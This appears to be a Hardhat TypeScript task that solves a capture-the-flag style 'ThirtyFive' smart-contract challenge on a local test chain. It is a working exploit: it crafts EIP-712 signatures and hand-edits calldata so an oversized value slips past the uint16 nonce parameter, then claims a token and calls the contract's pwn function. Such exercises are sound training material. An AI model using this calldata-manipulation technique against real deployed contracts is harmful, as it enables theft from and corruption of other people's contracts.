import { task, types } from "hardhat/config";
import { HardhatRuntimeEnvironment, TaskArguments } from "hardhat/types";
import { ThirtyFive } from "../typechain";

task("solveThirtyFive", "Solves the ThirtyFive challenge")
    .addParam("thirtyFiveAddress", "Address of the exploitable contract", undefined, types.string, false)
    .setAction(async (args: TaskArguments, hre: HardhatRuntimeEnvironment) => {
        if (!hre.ethers.utils.isAddress(args.thirtyFiveAddress)) {
            throw new Error(`Invalid contract address format: ${args.thirtyFiveAddress}`);
        }

        const ThirtyFiveFactory = await hre.ethers.getContractFactory("ThirtyFive");
        const thirtyFiveChallenge = (await ThirtyFiveFactory.attach(args.thirtyFiveAddress)) as ThirtyFive;

        const signers = await hre.ethers.getSigners();
        const signer = signers[0];

        // Sign the message with EIP-712
        const domain = {
            name: "ThirtyFive",
            version: "1337",
            chainId: 31337,
            verifyingContract: "0x5fbdb2315678afecb367f032d93f642f64180aa3",
        };

        // The named list of all type definitions
        const types = {
            SIGNING: [
                { name: "nonce", type: "uint16" },
                { name: "expiry", type: "uint256" },
            ],
        };

        // The data to sign
        const value = {
            nonce: "0x0000000000000000000000000000000000000000000000000000000000000001",
            expiry: "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
        };

        const signature = await signer._signTypedData(domain, types, value);

        // Create custom encoded data
        const signItLikeYouMeanItABI = [
            "function signItLikeYouMeanIt(uint16 nonce, uint256 deadline, bytes memory signature)",
        ];
        const signItLikeYouMeanItIFace = new hre.ethers.utils.Interface(signItLikeYouMeanItABI);

        const encodedData = signItLikeYouMeanItIFace.encodeFunctionData("signItLikeYouMeanIt", [
            "0x00000001",
            value.expiry,
            signature,
        ]);

        // The trick is that the nonce being an uint16 is actually encoded as a uint256. We will take
        // advantage of that to pass a bigger value that will be set into the nonces map
        const fixedEncodedData =
            encodedData.substring(0, 10) +
            "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff0001" +
            encodedData.substring(74);

        let tx = await signer.sendTransaction({
            to: args.thirtyFiveAddress,
            data: fixedEncodedData,
        });
        await tx.wait();

        //const nonce = await thirtyFiveChallenge.nonces(signer.address);

        // Now generate a token
        tx = await thirtyFiveChallenge.giveMeMyToken();
        await tx.wait();

        const filter = thirtyFiveChallenge.filters.TokenGen(signer.address);
        const events = await hre.ethers.provider.getLogs(filter);
        const token = events[0].topics[2];

        // Pwn the contract!
        tx = await thirtyFiveChallenge.pwn(token);
        await tx.wait();

        //const pwnCounter = await thirtyFiveChallenge.pwnCounter(signer.address);
        const result = await thirtyFiveChallenge.HackerWho();

        console.log("Result:", result);
    });
